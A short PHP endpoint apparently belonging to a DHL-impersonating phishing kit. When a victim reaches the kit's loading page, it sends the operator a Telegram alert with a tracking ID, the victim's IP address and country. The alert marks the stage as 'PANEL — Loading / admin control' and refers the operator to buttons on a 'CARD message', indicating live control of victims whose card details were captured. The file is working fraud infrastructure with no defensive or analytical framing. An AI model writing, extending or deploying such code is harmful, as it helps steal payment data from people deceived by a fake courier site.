<?php
// User reached loading / panel — Telegram ping (deduped per token)
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

$identifier = 'panel_enter_' . $token;
if (wasNotificationSent($identifier)) {
    echo json_encode(['success' => true, 'skipped' => true]);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$country = getCountryFromIP($ip);
$shortId = substr($token, 3);

$message = "❁═══ DHL FUNNEL ═══❁\n";
$message .= "4️⃣ PANEL — Loading / admin control\n";
$message .= "📦 ID: {$shortId}\n\n";
$message .= "⏳ User is waiting on loading page\n";
$message .= "📡 IP: {$ip}\n🌐 {$country}\n";
$message .= "👇 Use inline buttons from the CARD message (or send a new action)";

$result = sendTelegramMessage($message, null);
if (!empty($result['ok'])) {
    saveSentNotification($identifier);
}

echo json_encode(['success' => !empty($result['ok'])]);
